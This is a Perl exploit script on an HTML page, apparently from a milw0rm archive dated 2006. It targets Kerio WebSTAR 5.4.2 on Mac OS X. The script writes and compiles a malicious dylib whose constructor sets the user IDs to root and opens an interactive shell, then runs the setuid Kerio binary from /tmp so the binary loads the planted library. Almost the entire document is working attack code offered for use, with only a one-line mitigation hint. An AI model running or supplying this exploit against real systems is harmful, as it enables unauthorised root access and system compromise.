<html><head><title>Kerio WebSTAR 5.4.2 (libucache.dylib) Privilege Escalation Exploit (OSX)</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# you must have access to the webstar user or be in the admin group
#
# This is currently not patched... chmod -s your kerio binaries

foreach $key (keys %ENV) {

   delete $ENV{$key};

}

$tgts{&quot;0&quot;} = &quot;kerio-webstar-5.4.2-mac.bin - WSAdminServer:/Applications/Kerio WebSTAR/AdminServer/WSAdminServer&quot;;
$tgts{&quot;1&quot;} = &quot;kerio-webstar-5.4.2-mac.bin - WSWebServer:/Applications/Kerio WebSTAR/WebServer/WSWebServer&quot;;

unless (($target) = @ARGV) {

       print &quot;\n\nUsage: $0 &lt;target&gt; \n\nTargets:\n\n&quot;;

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{&quot;$key&quot;});
               print &quot;\t$key . $a\n&quot;;
       }

       print &quot;\n&quot;;
       exit 1;
}

$ret = pack(&quot;l&quot;, ($retval));
($a,$b) = split(/\:/,$tgts{&quot;$target&quot;});
print &quot;*** Target: $a, Binary: $b\n&quot;;

open(KP,&quot;&gt;/tmp/kerio_pwn.c&quot;);
printf KP &quot;extern char * argv; __attribute__((constructor)) static void kerio_pwned()\n&quot;;
printf KP &quot;{ seteuid(0); setegid(0); setuid(0); setgid(0); system(\&quot;/bin/sh -i\&quot;); exit(0); }\n&quot;;

system(&quot;gcc -dynamiclib -o /tmp/libucache.dylib /tmp/kerio_pwn.c -current_version 5.0.1 -compatibility_version 5.0.1 -install_name libucache.5.dylib -arch ppc&quot;);

system(&quot;cd /tmp; \&quot;$b\&quot;&quot;);

# milw0rm.com [2006-11-15]</pre></html>